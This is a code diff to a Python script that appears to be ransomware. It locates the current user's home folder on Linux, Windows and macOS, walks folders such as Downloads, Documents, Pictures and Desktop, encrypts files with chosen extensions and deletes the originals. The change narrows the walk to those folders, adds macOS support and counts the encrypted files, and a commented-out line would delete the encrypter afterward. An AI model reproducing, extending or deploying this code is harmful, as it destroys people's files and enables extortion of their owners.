@@ -236,10 +236,8 @@ ext = ['.txt',
     '.iso','.zip','.tar','.tar.gz','.rar']
 
 def get_target():
-    # Encrypt on this location
     # Users home on Linux
     if platform == 'Linux':
-        #target = '/home/' + getpass.getuser() + '/'
         target = '/home/' + getpass.getuser() + '/'
         return target
 
@@ -247,20 +245,38 @@ def get_target():
     elif platform == 'Windows':
         target = 'C:\\\\Users\\\\' + getpass.getuser() + '\\\\'
         return target
+
+    # Users home on MacOS
     elif platform == 'Darwin':
         target = '/Users/' + getpass.getuser() + '/'
         return target
     else:
-        sys.exit(1) # Cannot find users home directory, skip MacOS.
+        sys.exit(1) # Cannot find users home directory.
 
 def start_encrypt(p, key):
+    c = 0
+
+    if platform == 'Windows':
+        dirs = ['Downloads', 'Documents', 'Pictures', 'Music', 'Onedrive', 'Desktop']
+    elif platform == 'Darwin':
+        dirs = ['Downloads', 'Documents', 'Downloads', 'Pictures', 'Music']
+    elif platform == 'Linux':
+        dirs = ['Downloads', 'Documents', 'Desktop', 'Pictures']
+
     try:
-        for path, subdirs, files in os.walk(p):
-            for name in files:
-                for i in ext:
-                    if name.endswith(i.lower()):
-                        encrypt_file(os.path.join(path, name), key)
-                        os.remove(os.path.join(path, name))
+        for x in dirs:
+            if platform == 'Windows':
+                target = p + x + '\\\\'
+            else:
+                target = p + x + '/'
+
+            for path, subdirs, files in os.walk(target):
+                for name in files:
+                    for i in ext:
+                        if name.endswith(i.lower()):
+                            encrypt_file(os.path.join(path, name), key)
+                            c +=1
+                            os.remove(os.path.join(path, name))
 
         #os.remove(sys.argv[0]) # destroy encrypter when finished
     except Exception as e:
